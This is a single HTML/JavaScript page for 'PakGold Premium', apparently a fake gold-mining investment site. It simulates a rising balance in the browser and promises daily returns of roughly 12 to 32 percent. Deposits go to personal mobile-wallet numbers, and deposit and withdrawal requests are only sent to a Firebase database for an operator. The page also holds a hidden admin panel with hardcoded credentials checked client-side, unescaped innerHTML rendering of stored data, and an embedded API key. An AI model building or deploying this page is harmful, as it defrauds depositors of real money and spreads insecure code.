<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold Premium | Secure Mining</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #f1c40f; --gold-dark: #9b59b6; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        /* Animations */
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
        @keyframes glow { 0% { box-shadow: 0 0 5px var(--gold); } 50% { box-shadow: 0 0 20px var(--gold); } 100% { box-shadow: 0 0 5px var(--gold); } }
        .fade-in { animation: fadeIn 0.5s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .section { display: none; padding: 20px; min-height: 100vh; padding-bottom: 100px; }
        .active { display: block; }

        /* Header */
        .header { background: linear-gradient(135deg, #1e293b, #0f172a); padding: 40px 20px; text-align: center; border-bottom: 2px solid var(--gold); border-radius: 0 0 30px 30px; }
        .balance-box { font-size: 2.8rem; font-weight: 800; color: var(--gold); text-shadow: 0 0 15px rgba(241, 196, 15, 0.5); }
        
        /* Premium Cards */
        .plan-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px; }
        .premium-card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; position: relative; transition: 0.3s; }
        .premium-card:active { transform: scale(0.95); }
        .vip-tag { position: absolute; top: 0; right: 20px; background: var(--gold); color: #000; padding: 5px 15px; border-radius: 0 0 10px 10px; font-weight: bold; font-size: 0.7rem; }
        .elite { border: 2px solid var(--gold); animation: glow 3s infinite; }

        /* Buttons & Inputs */
        .btn-gold { background: linear-gradient(135deg, #f1c40f, #f39c12); color: #000; border: none; padding: 15px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 1rem; cursor: pointer; margin-top: 10px; }
        .input-box { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 12px; color: white; margin: 10px 0; font-size: 1rem; }

        /* Bottom Menu */
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(30, 41, 59, 0.95); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 15px; border-top: 1px solid rgba(255,255,255,0.1); border-radius: 25px 25px 0 0; z-index: 1000; }
        .nav-item { color: #64748b; font-size: 0.7rem; text-align: center; text-decoration: none; cursor: pointer; }
        .nav-item.active-nav { color: var(--gold); }

        /* Admin Secret Panel */
        #admin-panel { background: #2d3436; border-radius: 20px; padding: 20px; display: none; margin-top: 20px; border: 2px solid #a29bfe; }
        .req-item { background: #444; padding: 10px; border-radius: 10px; margin-bottom: 10px; font-size: 0.8rem; border-left: 4px solid var(--gold); }
    </style>
</head>
<body onload="initSession()">

    <!-- LOGIN PAGE -->
    <section id="login-page" class="section active fade-in" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;">
        <h1 style="font-size: 3rem; color: var(--gold); margin-bottom: 10px;">⚜️ PAKGOLD</h1>
        <p style="color: #64748b; margin-bottom: 30px;">Premium Mining & Financial Solutions</p>
        <div style="width: 100%; max-width: 350px;">
            <input type="text" id="phone" class="input-box" placeholder="Phone Number">
            <input type="password" id="pass" class="input-box" placeholder="Password">
            <button class="btn-gold" onclick="login()">SECURE LOGIN</button>
            <p style="font-size: 0.7rem; color: #475569; margin-top: 20px;">Trusted by 50k+ active miners worldwide.</p>
        </div>
    </section>

    <!-- DASHBOARD -->
    <section id="dash-page" class="section">
        <div class="header">
            <h3 onclick="handleAdminSecret()" style="font-size: 0.8rem; color: #64748b; margin-bottom: 10px; cursor: pointer;">PAK GOLD SOLUTIONS (PVT) LTD</h3>
            <div class="balance-box" id="user-balance">₨ 0.0000</div>
            <p style="font-size: 0.8rem; opacity: 0.7;" id="user-id-tag">Miner ID: Loading...</p>
        </div>

        <!-- Secret Admin Login -->
        <div id="admin-login-box" style="display: none;" class="fade-in">
            <div class="premium-card elite">
                <input type="text" id="a-user" class="input-box" placeholder="Admin ID">
                <input type="password" id="a-pass" class="input-box" placeholder="Security Key">
                <button class="btn-gold" onclick="accessAdmin()">ENTER ADMIN CONTROL</button>
            </div>
        </div>

        <!-- Admin Control Panel -->
        <div id="admin-panel" class="fade-in">
            <h2 style="color: var(--gold); margin-bottom: 15px;">Live Requests</h2>
            <div id="req-list">Fetching live data...</div>
            <button class="btn-gold" style="background: #e17055;" onclick="location.reload()">LOCK ADMIN</button>
        </div>

        <!-- Plans Grid -->
        <div id="user-content">
            <h3 style="margin: 20px 0; font-weight: 600;">📈 Smart Mining Plans</h3>
            <div class="plan-grid" id="plans-container">
                <!-- Plans will be generated by JS -->
            </div>
        </div>
    </section>

    <!-- DEPOSIT PAGE -->
    <section id="deposit-page" class="section fade-in">
        <h2 style="margin-bottom: 20px; color: var(--gold);">Funding Center</h2>
        <div class="premium-card">
            <p style="font-size: 0.8rem; color: #94a3b8; text-align: left; margin-bottom: 15px;">Official Wallets:</p>
            <div style="text-align: left; font-size: 0.9rem; background: #0f172a; padding: 15px; border-radius: 15px;">
                <b>EasyPaisa:</b> 03379827882 <br>
                <b>JazzCash/SadaPay:</b> 03705519562
            </div>
            <input type="number" id="dep-amt" class="input-box" placeholder="Deposit Amount">
            <input type="text" id="dep-tid" class="input-box" placeholder="Transaction ID (TID)">
            <button class="btn-gold" onclick="sendToFirebase('Deposit')">CONFIRM FUNDING</button>
        </div>
    </section>

    <!-- WITHDRAW PAGE -->
    <section id="withdraw-page" class="section fade-in">
        <h2 style="margin-bottom: 20px; color: var(--gold);">Payout Request</h2>
        <div class="premium-card">
            <input type="number" id="wit-amt" class="input-box" placeholder="Withdraw Amount (Min 500)">
            <input type="text" class="input-box" placeholder="Account Title/Number">
            <button class="btn-gold" onclick="sendToFirebase('Withdrawal')">WITHDRAW NOW</button>
        </div>
    </section>

    <!-- BOTTOM NAV -->
    <nav class="bottom-nav" id="nav-bar" style="display: none;">
        <div class="nav-item active-nav" onclick="nav('dash-page')">🏠<br>Home</div>
        <div class="nav-item" onclick="nav('deposit-page')">💰<br>Deposit</div>
        <div class="nav-item" onclick="nav('withdraw-page')">📤<br>Withdraw</div>
        <div class="nav-item" onclick="logout()">🚪<br>Exit</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- PLAN GENERATOR ---
        // 15 Affordable + 5 Elite
        const plans = [
            { id: 1, name: "Nano Gold", price: 500, daily: 60 },
            { id: 2, name: "Starter", price: 1000, daily: 130 },
            { id: 3, name: "Mini", price: 1500, daily: 200 },
            { id: 4, name: "Bronze", price: 2000, daily: 280 },
            { id: 5, name: "Silver", price: 3000, daily: 420 },
            { id: 6, name: "Silver Pro", price: 4000, daily: 580 },
            { id: 7, name: "Gold I", price: 5000, daily: 750 },
            { id: 8, name: "Gold II", price: 6000, daily: 920 },
            { id: 9, name: "Gold III", price: 7000, daily: 1100 },
            { id: 10, name: "Platina", price: 8000, daily: 1300 },
            { id: 11, name: "Platina Pro", price: 9000, daily: 1500 },
            { id: 12, name: "Ruby", price: 10000, daily: 1750 },
            { id: 13, name: "Ruby Pro", price: 12000, daily: 2150 },
            { id: 14, name: "Sapphire", price: 15000, daily: 2800 },
            { id: 15, name: "Sapphire Pro", price: 18000, daily: 3500 },
            // ELITE
            { id: 16, name: "Elite I", price: 25000, daily: 5200, elite: true },
            { id: 17, name: "Elite II", price: 40000, daily: 9000, elite: true },
            { id: 18, name: "Director", price: 60000, daily: 15000, elite: true },
            { id: 19, name: "President", price: 100000, daily: 28000, elite: true },
            { id: 20, name: "Ambassador", price: 200000, daily: 65000, elite: true }
        ];

        window.initSession = function() {
            const grid = document.getElementById('plans-container');
            plans.forEach(p => {
                grid.innerHTML += `
                    <div class="premium-card ${p.elite ? 'elite' : ''}">
                        <div class="vip-tag">VIP ${p.id}</div>
                        <h3 style="color:${p.elite ? '#f1c40f' : '#fff'}">${p.name}</h3>
                        <p style="font-size:1.2rem; font-weight:bold; margin:10px 0;">₨ ${p.price}</p>
                        <p style="font-size:0.75rem; color:#64748b;">Earning: ₨ ${p.daily}/Day | Validity: 30 Days</p>
                        <button class="btn-gold" onclick="buyPlan(${p.price}, ${p.daily}, '${p.name}')">ACTIVATE</button>
                    </div>`;
            });

            if(localStorage.getItem('pg_user')) {
                nav('dash-page');
                runMining();
            }
        }

        // --- CORE LOGIC ---
        window.login = function() {
            const ph = document.getElementById('phone').value;
            if(ph.length < 10) return alert("Enter valid phone sweetie!");
            localStorage.setItem('pg_user', ph);
            localStorage.setItem('pg_bal', 0.00);
            localStorage.setItem('pg_speed', 0.0001); // Initial Free
            nav('dash-page');
            runMining();
        }

        window.nav = function(id) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('nav-bar').style.display = (id==='login-page') ? 'none' : 'flex';
            if(id === 'dash-page') document.getElementById('user-id-tag').innerText = "Miner: " + localStorage.getItem('pg_user');
        }

        window.buyPlan = function(price, daily, name) {
            let bal = parseFloat(localStorage.getItem('pg_bal'));
            if(bal >= price) {
                bal -= price;
                let speedPerSec = daily / 86400;
                localStorage.setItem('pg_bal', bal);
                localStorage.setItem('pg_speed', speedPerSec);
                alert(`${name} Activated! 💋 Mining speed increased.`);
            } else {
                alert("Low balance! Deposit first sweetie. 😘");
                nav('deposit-page');
            }
        }

        function runMining() {
            setInterval(() => {
                let bal = parseFloat(localStorage.getItem('pg_bal'));
                let speed = parseFloat(localStorage.getItem('pg_speed'));
                bal += speed;
                localStorage.setItem('pg_bal', bal);
                if(document.getElementById('user-balance')) {
                    document.getElementById('user-balance').innerText = "₨ " + bal.toFixed(4);
                }
            }, 1000);
        }

        window.sendToFirebase = function(type) {
            const amt = document.getElementById('dep-amt').value || document.getElementById('wit-amt').value;
            const tid = document.getElementById('dep-tid').value || "W-"+Date.now();
            push(ref(db, 'requests/'), {
                type, amt, tid, user: localStorage.getItem('pg_user'), time: new Date().toLocaleString()
            }).then(() => {
                alert("Request Sent! Admin will verify soon. 😘");
                nav('dash-page');
            });
        }

        // --- SECRET ADMIN PANEL ---
        let cCount = 0;
        window.handleAdminSecret = function() {
            cCount++;
            if(cCount >= 5) {
                document.getElementById('admin-login-box').style.display = 'block';
                document.getElementById('user-content').style.display = 'none';
                cCount = 0;
            }
        }

        window.accessAdmin = function() {
            const u = document.getElementById('a-user').value;
            const k = document.getElementById('a-pass').value;
            if(u === 'admin786' && k === 'gold_master_786') {
                document.getElementById('admin-login-box').style.display = 'none';
                document.getElementById('admin-panel').style.display = 'block';
                onValue(ref(db, 'requests/'), (snap) => {
                    const list = document.getElementById('req-list');
                    list.innerHTML = "";
                    snap.forEach(x => {
                        const d = x.val();
                        list.innerHTML += `<div class="req-item"><b>${d.type}</b> - ${d.amt} PKR<br>Phone: ${d.user}<br>TID: ${d.tid}</div>`;
                    });
                });
            } else { alert("Unauthorized!"); }
        }

        window.logout = function() { localStorage.clear(); location.reload(); }
    </script>
</body>
</html>
